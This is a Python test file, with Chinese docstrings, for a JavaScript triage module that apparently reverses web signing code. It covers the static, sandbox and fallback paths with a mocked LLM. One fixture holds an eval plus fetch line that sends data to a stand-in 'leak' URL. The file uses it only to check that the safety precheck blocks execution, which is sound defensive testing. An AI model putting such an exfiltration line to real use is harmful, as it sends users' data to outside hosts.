#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""K.2 AB 分诊测试：纯函数(A)→沙箱执行(B)→降级(C) 三路 + LLM 失败不报错。

验收口径（任务卡）：同一目标从纯函数到重度混淆样本各 1 个，日志分别走
A/B/C 路径且 C 不报错。分诊结果 JSON 落盘供审计。
"""
import asyncio
import json
import shutil
from pathlib import Path

import pytest

from vulnclaw.ai.js_retriever import JSTriage

FIX_A = Path(__file__).parent / "fixtures" / "js_crypto" / "sample_login.html"

# B 路样本：自定义 XOR 签名（非已知 CryptoJS 模式 → 静态不命中），纯函数、无 IO
JS_B_PURE = (
    "function makeSign(t){"
    "return t.split('').map(function(c){"
    "return String.fromCharCode(c.charCodeAt(0) ^ 0x5A);"
    "}).join('');"
    "}"
    "var s = makeSign('abc');"
)
# C 路样本：eval + fetch（安全预检必须拒绝执行）
JS_C_TOX = (
    'var x = eval("1+1");'
    'fetch("http://example.com/leak?d=" + x);'
    "function makeSign(t){return t + x;}"
)
# C 路样本2：静态不命中 + LLM 判 UNKNOWN
JS_C_UNKNOWN = (
    "function makeSign(t){return 'SIGN_' + window.foo.bar(t);}"
)


async def _run(text, param="sign", is_html=True, verdict=None, llm_exc=None):
    async def fake_llm(_snippet):
        if llm_exc is not None:
            raise llm_exc
        return {"verdict": verdict, "algorithm": "test", "params": []}

    t = JSTriage(llm_ask=fake_llm, audit_dir="/tmp/js_triage_test")
    return await t.triage(text, param=param, is_html=is_html)


def test_triage_a_static_restore():
    """A 路：静态规则还原（0 LLM 调用）。"""
    res = asyncio.run(_run(FIX_A.read_text(encoding="utf-8", errors="replace"),
                           verdict="EXECUTE"))  # 即便 LLM 说 EXECUTE，A 必须先命中
    assert res["path"] == "A"
    assert res["reason"] == "static_restore"
    assert res["restorable"] is True
    assert res["llm_backed"] is False
    assert "key" in json.dumps(res["recipe"], ensure_ascii=False).lower()


def test_triage_b_sandbox_execute():
    """B 路：静态失败 + LLM 判 EXECUTE + 预检通过 → node 沙箱执行成功。"""
    if not shutil.which("node"):
        pytest.skip("node 不可用")
    res = asyncio.run(_run(JS_B_PURE, is_html=False, verdict="EXECUTE"))
    import vulnclaw.ai.js_retriever.triage as _T
    print("PYTEST TRIAGE FILE:", _T.__file__)
    print("PYTEST RES:", res)
    assert res["path"] == "B"
    assert res["exec"].get("ok") is True
    assert res["safe"] is True


def test_triage_c_unsafe_blocked():
    """C 路：预检拒绝（eval/fetch）→ 不执行、降级 C、不报错。"""
    res = asyncio.run(_run(JS_C_TOX, is_html=False, verdict="EXECUTE"))
    assert res["path"] == "C"
    assert res["safe"] is False
    assert res["reason"] == "unsafe_features_blocked"


def test_triage_c_unknown_verdict():
    """C 路：LLM 判 UNKNOWN → 降级 C。"""
    res = asyncio.run(_run(JS_C_UNKNOWN, is_html=False, verdict="UNKNOWN"))
    assert res["path"] == "C"
    assert res["reason"] == "unknown"


def test_triage_c_llm_down_no_raise():
    """C 路：LLM 抛异常 → 降级 C 且不抛错（验收硬性要求）。"""
    res = asyncio.run(_run(JS_B_PURE, is_html=False, llm_exc=RuntimeError("LLM down")))
    assert res["path"] == "C"
    assert res["reason"] == "unknown"


def test_triage_audit_json(tmp_path):
    """审计：分诊结果 JSON 落盘。"""
    t = JSTriage(
        llm_ask=lambda _s: None,   # 非 async 也会被 await -> 直接抛 TypeError -> C
        audit_dir=str(tmp_path),
    )
    res = asyncio.run(t.triage(JS_C_TOX, is_html=False))
    assert res["path"] == "C"          # 回调异常被吞，不报错
    files = list(tmp_path.glob("*.json"))
    assert len(files) >= 1
    dumped = json.loads(files[0].read_text(encoding="utf-8"))
    assert dumped["param"] == ""
    assert dumped["path"] in ("A", "B", "C")
